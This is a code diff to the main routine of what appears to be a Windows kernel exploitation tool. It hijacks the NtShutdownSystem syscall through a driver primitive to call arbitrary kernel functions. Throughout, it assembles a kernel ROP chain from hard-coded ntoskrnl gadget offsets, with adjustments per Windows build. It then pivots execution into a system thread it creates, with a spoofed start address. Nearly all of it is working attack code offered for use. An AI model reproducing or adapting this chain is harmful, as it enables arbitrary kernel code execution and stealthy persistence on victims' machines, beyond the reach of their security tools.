@@ -18,6 +18,14 @@ int main()
         return EXIT_FAILURE;
     }
 
+    const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
+    if (WindowsBuild.empty())
+    {
+        std::exception("Failed to find the windows build being used");
+        return EXIT_FAILURE;
+    }
+
+    std::printf("[+] Windows build: %s\n", WindowsBuild.c_str());
     std::printf("[+] New thread address to be used @ 0x%p\n", RandomValidThreadAddress);
     std::printf("[+] ntoskrnl.exe @ 0x%p\n", Driver::GetKernelModuleBase());
 
@@ -25,11 +33,9 @@ int main()
 
     const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");
 
-    //KernelCaller.RedirectCall(
-    //    (void*)(Driver::GetKernelModuleBase() + (std::uint64_t)Driver::GetKernelFunctionOffset("NtShutdownSystem")),
-    //    (void*)(Driver::GetKernelModuleBase() + 0x345F40)
-    //);
     KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
+    void* PivotDataAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x58, (void*)MAXULONG64);
+    void* DummyMemoryAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* IntervalArgAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
     void* CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* StackLimitStoreAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
@@ -40,7 +46,7 @@ int main()
     std::printf("[+] Original Stack @ 0x%p\n", OriginalStackAllocation);
     std::printf("[+] Current Stack Offset @ 0x%p\n", CurrentStackOffsetAddress);
 
-    if (!StackAllocation || !OriginalStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress)
+    if (!StackAllocation || !OriginalStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress || !PivotDataAllocation)
         return EXIT_FAILURE;
 
     // Zero out stack allocation
@@ -52,59 +58,16 @@ int main()
 
     StackManager KernelStackManager(Driver::GetKernelModuleBase(), reinterpret_cast<std::uintptr_t>(StackAllocation));
 
-    // Fake the thread's start address to the random legitimate one we found
-    //KernelStackManager.ModifyThreadStartAddress(RandomValidThreadAddress);
-    //KernelStackManager.ModifyThreadStackBaseAndLimit(((uintptr_t)StackAllocation)+0x6000, (uintptr_t)StackAllocation);
-    //KernelStackManager.AddFunctionCall<int>("KeLowerIrql", 0);
-    //KernelStackManager.AddFunctionCall<NTSTATUS>("PsTerminateSystemThread", 0);
-
-    //// loop demo
-    //KernelStackManager.AddFunctionCall("KeDelayExecutionThread", 0, FALSE, (uint64_t)IntervalArgAllocation);
-    //KernelStackManager.AddFunctionCall("MmAllocateContiguousMemory", 0x6000, MAXULONG64);
-    //// we need to increment the addr by 0x2000
-    //KernelStackManager.AddGadget(0x256c4a, "pop rcx; ret;");
-    //KernelStackManager.AddValue(0x2000, "value to increment ptr by");
-    //KernelStackManager.AddGadget(0x28efa4, "add rax, rcx; ret;");
-
-    //KernelStackManager.AddGadget(0x54810e, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    //KernelStackManager.AddPadding(0x28);
-    //KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
-    //KernelStackManager.AddGadget(0x3cca89, "pop rdx; ret;");
-    //KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
-    //KernelStackManager.AddGadget(0x2f7921, "pop r8; ret;");
-    //// NOTE: this was 0x6000 before
-    //KernelStackManager.AddValue(0x4000, "count value");
-    //KernelStackManager.AddFunctionCall("memcpy");
-
-    //KernelStackManager.AddGadget(0x36d2de, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
-    //KernelStackManager.AddGadget(0xb4296a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
-    //KernelStackManager.AddGadget(0x536d2a, "mov rsp, r11; ret;");
-
-    // pivot into thread's created stack demo
-    // Grab stack limit
+    // setup ropchain for our main loop
     KernelStackManager.AddFunctionCall("PsGetCurrentThread");
     KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
     KernelStackManager.AddValue(0x30, "stack limit");
     KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
-    // set rsi so we can jump to it next gadget
-    KernelStackManager.AddGadget(0x2034ce, "pop rsi; ret;");
-    KernelStackManager.AddValue(Driver::GetKernelModuleBase() + 0x20043b, "jump address (ret; gadget)");
-    // r13=rax
-    KernelStackManager.AddGadget(0x6a8c21, "mov r13, rax; mov r14, rax; mov r15, rax; lfence; jmp rsi;");
 
-    // rax = pool allocation
-    //KernelStackManager.AddFunctionCall("ExAllocatePool2", 0x40, 8, 'Thre');
-    KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
+    // rdx = stack limit store address
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
     KernelStackManager.AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
 
-    // rdx = pool allocation
-    KernelStackManager.AddGadget(0x602d6d, "mov r8, rax; mov rax, r8; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x429a44, "mov rdx, rax; cmp r8, rax; ja 0x435f5d; mov eax, 1; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    // rax = addr of stack limit
-    KernelStackManager.AddGadget(0x25f580, "mov rax, r13; add rsp, 0x48; pop r15; pop r13; ret;");
-    KernelStackManager.AddPadding(0x48 + 0x10);
     // dereference rax, so that rax = stack limit
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
     KernelStackManager.AddGadget(0x432d4d, "mov qword ptr [rdx], rax; ret;");
@@ -113,17 +76,16 @@ int main()
     // move rax into rbx to preserve it
     KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
     // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
-    // store rax in r10
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
     // read the value of the current stack offset global variable
     KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
-    // move rax into rcx so we store the offset in rcx
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    // rcx=0
+    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddValue(0, "set rcx to 0");
+    // move eax into ecx so we store the offset in rcx (we don't need to use full 64bits because CurrentStackOffsetAddress
+    // holds a small value, either 0x2000 or 0x4000 as an offset
+    KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
     // restore the old value of rax into rax from rbx
     KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddPadding(0x20 + 0x8);
@@ -131,9 +93,22 @@ int main()
 
 
     // Write our own stack into thread's legitimate stack
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+
+    // r9=rax, IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
+    // if yours includes it, then you must account for this in the check which decides if padding should be added
+    KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
+    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+        KernelStackManager.AddPadding(0x28);
+
+    // this gadget can either write into r8 or rdx, depending on the window version, so we will set both
+    // to a valid memory dummy pool so that it writes there.
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
+    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
+
+
     KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
     KernelStackManager.AddValue((std::uint64_t)OriginalStackAllocation, "src address");
     KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
@@ -153,24 +128,27 @@ int main()
     // same code as above - basically just get the value of CurrentStackOffsetAddress
     // and add it to rax. so rax = stacklimit + curr_stack_offset
     KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
     KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
     KernelStackManager.AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    KernelStackManager.AddGadget(0x24cd7b, "pop rcx; ret;");
+    KernelStackManager.AddValue(0, "set rcx to 0");
+    KernelStackManager.AddGadget(0x212fcb, "xchg ecx, eax; ret;");
     KernelStackManager.AddGadget(0x56f5f2, "push rbx; pop rax; add rsp, 0x20; pop rbx; ret;");
     KernelStackManager.AddPadding(0x20 + 0x8);
     KernelStackManager.AddGadget(0x263f08, "add rax, rcx; ret;");
 
-    // rcx=rax, stored here so we can overwrite rax for xor operation
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
-    KernelStackManager.AddGadget(0x302e3e, "mov rcx, rax; cmp rax, r10; jne 0x36d2e8; ret;");
+    // same as above r9->rax->rcx, this is being stored here so we can overwrite rax for xor operation
+    KernelStackManager.AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
+    if (WindowsBuild == "22H2" || WindowsBuild == "23H2")
+        KernelStackManager.AddPadding(0x28);
+    KernelStackManager.AddGadget(0x480032, "pop rdx; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
+    KernelStackManager.AddGadget(0x47f82d, "pop r8; ret;");
+    KernelStackManager.AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    KernelStackManager.AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
     // r11=rcx
-    KernelStackManager.AddGadget(0xb4096a, "mov r11, rcx; cmp edx, dword ptr [rax]; je 0xb42978; mov eax, 0xc000000d; ret;");
+    KernelStackManager.AddGadget(0xb4096a, "mov r11, rcx; mov r9d, edx; cmp edx, dword ptr [rax]; je 0x......; mov eax, 0xc000000d; ret;");
 
     // xor the current stack offset by global by 0x6000 (0x2000 ^ 0x4000 = 0x6000),
     // meaning we will always swap between 0x2000 and 0x4000 per iteration.
@@ -189,7 +167,12 @@ int main()
 
     std::uint64_t CurrentStackOffsetStartValue = 0x2000;
 
+    void* PivotJumpAddress = (void*)(Driver::GetKernelModuleBase() + 0x20043b);
+    void* NewRspAddress = (void*)((uint64_t)StackAllocation + 0x2000);
+
     KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(IntervalArgAllocation, &SleepInterval, sizeof(SleepInterval));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 0x2000), KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
@@ -199,11 +182,11 @@ int main()
     Sleep(500);
     std::cin.get();
 
-    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x9bdb51); // push rcx; pop rsp; test edx, edx; je 0x9b8acd; add rsp, 0x28; ret;
-    void* OffsetedStackAllocation = (void*)((std::uintptr_t)StackAllocation + 0x2000 - 0x28); // account for 0x28 being added in gadget
+    // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
+    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x698bd0);
 
     HANDLE KernelThreadHandle;
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, OffsetedStackAllocation);
+    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, PivotDataAllocation);
     NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
         &KernelThreadHandle,
         THREAD_ALL_ACCESS,
